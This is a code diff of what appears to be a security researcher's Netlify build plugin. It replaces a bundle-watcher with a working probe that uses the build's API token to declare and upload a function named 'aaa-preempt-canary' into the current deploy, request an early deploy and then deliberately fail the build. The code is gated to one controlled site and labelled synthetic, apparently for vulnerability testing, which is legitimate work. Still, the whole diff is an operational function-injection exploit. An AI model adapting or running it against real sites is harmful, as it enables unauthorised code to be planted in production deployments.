@@ -1,11 +1,10 @@
-import { existsSync, readFileSync, readdirSync, writeFileSync } from 'node:fs'
+import { createHash } from 'node:crypto'
+import { readFileSync, readdirSync } from 'node:fs'
 import { createConnection } from 'node:net'
 import { isAbsolute, relative, resolve } from 'node:path'
-import { fileURLToPath } from 'node:url'
-import { spawn } from 'node:child_process'
 
 const EXPECTED_SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'
-const WATCH_MODE = '--watch-bundled-function'
+const FUNCTION_NAME = 'aaa-preempt-canary'
 
 const findBuildbotSocket = () => {
   try {
@@ -78,56 +77,62 @@ const requestEarlyDeploy = (deployDir) =>
     client.once('close', finish)
   })
 
-const countFunctionBundles = (functionsDist) => {
+const callJson = async ({ body, method, token, url }) => {
   try {
-    return readdirSync(functionsDist, { withFileTypes: true }).filter(
-      (entry) => entry.isFile() && entry.name.endsWith('.zip'),
-    ).length
-  } catch {
-    return 0
-  }
-}
-
-const runWatcher = async ({ deployDir, functionsDist, publishDir }) => {
-  const startedAt = Date.now()
-  let bundleCount = 0
-
-  while (Date.now() - startedAt < 120_000) {
-    bundleCount = countFunctionBundles(functionsDist)
-    if (bundleCount > 0) break
-    await new Promise((resolveWait) => setTimeout(resolveWait, 2))
-  }
-
-  const result = {
-    schema: 'netlify-post-bundle-function-preemption-watcher.v1',
-    functionBundleObserved: bundleCount > 0,
-    functionBundleCount: bundleCount,
-    credentialValuesLogged: false,
-    syntheticOnly: true,
-  }
-
-  if (result.functionBundleObserved) {
+    const response = await fetch(url, {
+      method,
+      headers: {
+        authorization: `Bearer ${token}`,
+        'content-type': 'application/json',
+      },
+      body: JSON.stringify(body),
+      redirect: 'error',
+      signal: AbortSignal.timeout(20_000),
+    })
+    let responseBody = null
     try {
-      writeFileSync(
-        resolve(publishDir, 'post-bundle-watcher.json'),
-        `${JSON.stringify({ ...result, deployRequested: true })}\n`,
-        { mode: 0o600 },
-      )
-      result.markerWrittenBeforeDeploy = true
-    } catch {
-      result.markerWrittenBeforeDeploy = false
+      responseBody = await response.json()
+    } catch {}
+    return {
+      status: response.status,
+      ok: response.ok,
+      requiredFunctionCount: Array.isArray(responseBody?.required_functions)
+        ? responseBody.required_functions.length
+        : null,
+      state: ['new', 'pending_review', 'accepted', 'enqueued', 'building', 'uploading', 'uploaded', 'preparing', 'prepared', 'processing', 'processed', 'ready', 'error', 'retrying'].includes(responseBody?.state)
+        ? responseBody.state
+        : null,
     }
-    result.deploy = await requestEarlyDeploy(deployDir)
+  } catch (error) {
+    return { requestFailed: true, errorClass: error?.constructor?.name || 'Error' }
   }
-
-  console.log(`NETLIFY_POST_BUNDLE_FUNCTION_WATCHER ${JSON.stringify(result)}`)
 }
 
-const readPolicy = async ({ token, apiHost }) => {
+const uploadFunction = async ({ apiBase, bundle, deployId, token }) => {
   try {
-    const base = /^https?:\/\//i.test(apiHost || '') ? apiHost : `https://${apiHost || 'api.netlify.com'}`
-    const response = await fetch(new URL(`/api/v1/sites/${EXPECTED_SITE_ID}`, base), {
-      headers: { Authorization: `Bearer ${token}` },
+    const url = new URL(`/api/v1/deploys/${deployId}/functions/${FUNCTION_NAME}`, apiBase)
+    url.searchParams.set('runtime', 'js')
+    url.searchParams.set('size', String(bundle.length))
+    const response = await fetch(url, {
+      method: 'PUT',
+      headers: {
+        authorization: `Bearer ${token}`,
+        'content-type': 'application/octet-stream',
+      },
+      body: bundle,
+      redirect: 'error',
+      signal: AbortSignal.timeout(20_000),
+    })
+    return { status: response.status, ok: response.ok }
+  } catch (error) {
+    return { requestFailed: true, errorClass: error?.constructor?.name || 'Error' }
+  }
+}
+
+const readPolicy = async ({ token, apiBase }) => {
+  try {
+    const response = await fetch(new URL(`/api/v1/sites/${EXPECTED_SITE_ID}`, apiBase), {
+      headers: { authorization: `Bearer ${token}` },
       redirect: 'error',
       signal: AbortSignal.timeout(10_000),
     })
@@ -138,65 +143,76 @@ const readPolicy = async ({ token, apiHost }) => {
   }
 }
 
-if (process.argv[2] === WATCH_MODE) {
-  await runWatcher({
-    functionsDist: process.argv[3],
-    deployDir: process.argv[4],
-    publishDir: process.argv[5],
-  })
-  process.exit(0)
+const findFunctionBundle = (functionsDist) => {
+  const exactName = `${FUNCTION_NAME}.zip`
+  try {
+    return readdirSync(functionsDist).includes(exactName) ? resolve(functionsDist, exactName) : null
+  } catch {
+    return null
+  }
 }
 
-export const onPostBuild = async ({ constants }) => {
+export const onPostBuild = async ({ constants, utils }) => {
   const publishDir = resolve(constants.PUBLISH_DIR || '')
   const repositoryRoot = resolve(process.cwd())
   const functionsDist = resolve(constants.FUNCTIONS_DIST || '')
   const deployDir = relative(repositoryRoot, publishDir) || '.'
-  const publishInsideRepository = !isAbsolute(deployDir) && !deployDir.startsWith('..')
-  const policy =
-    typeof constants.NETLIFY_API_TOKEN === 'string' && constants.NETLIFY_API_TOKEN.length > 0
-      ? await readPolicy({ token: constants.NETLIFY_API_TOKEN, apiHost: constants.NETLIFY_API_HOST })
-      : null
-  const functionBundleCountAtPluginTime = countFunctionBundles(functionsDist)
-  const prerequisitesSatisfied =
-    process.env.CONTEXT === 'deploy-preview' &&
-    process.env.REVIEW_ID === '1' &&
-    constants.SITE_ID === EXPECTED_SITE_ID &&
-    policy?.untrustedFlow === 'redact' &&
-    publishInsideRepository &&
-    isAbsolute(functionsDist) &&
-    existsSync(publishDir) &&
-    functionBundleCountAtPluginTime === 0
-
+  const deployId = process.env.DEPLOY_ID || ''
+  const token = constants.NETLIFY_API_TOKEN
+  const apiBase = /^https?:\/\//i.test(constants.NETLIFY_API_HOST || '')
+    ? constants.NETLIFY_API_HOST
+    : `https://${constants.NETLIFY_API_HOST || 'api.netlify.com'}`
+  const bundlePath = findFunctionBundle(functionsDist)
+  const policy = typeof token === 'string' && token.length > 0 ? await readPolicy({ token, apiBase }) : null
+  const prerequisites = {
+    deployPreview: process.env.CONTEXT === 'deploy-preview',
+    controlledReview: process.env.REVIEW_ID === '1',
+    controlledSite: constants.SITE_ID === EXPECTED_SITE_ID,
+    redactedPolicy: policy?.untrustedFlow === 'redact',
+    deployIdPresent: /^[0-9a-f]{24}$/.test(deployId),
+    tokenPresent: typeof token === 'string' && token.length > 0,
+    publishInsideRepository: !isAbsolute(deployDir) && !deployDir.startsWith('..'),
+    functionBundlePresent: bundlePath !== null,
+  }
   const result = {
-    schema: 'netlify-post-bundle-function-preemption.v1',
-    contextIsDeployPreview: process.env.CONTEXT === 'deploy-preview',
-    reviewIdIsOne: process.env.REVIEW_ID === '1',
-    siteIdMatches: constants.SITE_ID === EXPECTED_SITE_ID,
+    schema: 'netlify-build-token-function-injection.v1',
+    prerequisites,
     policy,
-    publishInsideRepository,
-    functionsDistIsAbsolute: isAbsolute(functionsDist),
-    noFunctionBundlePresentAtPluginTime: functionBundleCountAtPluginTime === 0,
-    prerequisitesSatisfied,
-    watcherSpawned: false,
+    attempted: false,
     credentialValuesLogged: false,
+    functionBodyContainsSecretMaterial: false,
     syntheticOnly: true,
   }
 
-  if (prerequisitesSatisfied) {
-    const watcher = spawn(
-      process.execPath,
-      [fileURLToPath(import.meta.url), WATCH_MODE, functionsDist, deployDir, publishDir],
-      {
-        cwd: repositoryRoot,
-        detached: true,
-        env: {},
-        stdio: ['ignore', 'inherit', 'inherit'],
-      },
-    )
-    watcher.unref()
-    result.watcherSpawned = true
+  if (!Object.values(prerequisites).every(Boolean)) {
+    console.log(`NETLIFY_BUILD_TOKEN_FUNCTION_INJECTION ${JSON.stringify(result)}`)
+    return
   }
 
-  console.log(`NETLIFY_POST_BUNDLE_FUNCTION_PREEMPTION ${JSON.stringify(result)}`)
+  result.attempted = true
+  const bundle = readFileSync(bundlePath)
+  const bundleHash = createHash('sha256').update(bundle).digest('hex')
+  result.bundleSizePositive = bundle.length > 0
+  result.bundleHashShapeValid = /^[0-9a-f]{64}$/.test(bundleHash)
+
+  result.declare = await callJson({
+    method: 'PUT',
+    token,
+    url: new URL(`/api/v1/sites/${EXPECTED_SITE_ID}/deploys/${deployId}`, apiBase),
+    body: {
+      files: {},
+      functions: { [FUNCTION_NAME]: bundleHash },
+      function_schedules: [],
+      functions_config: {},
+    },
+  })
+  result.upload = await uploadFunction({ apiBase, bundle, deployId, token })
+
+  if (result.declare.ok && result.upload.ok) {
+    result.deploy = await requestEarlyDeploy(deployDir)
+  }
+
+  result.controlledFailureRequested = true
+  console.log(`NETLIFY_BUILD_TOKEN_FUNCTION_INJECTION ${JSON.stringify(result)}`)
+  utils.build.failBuild('Controlled failure after build-token function injection boundary probe')
 }
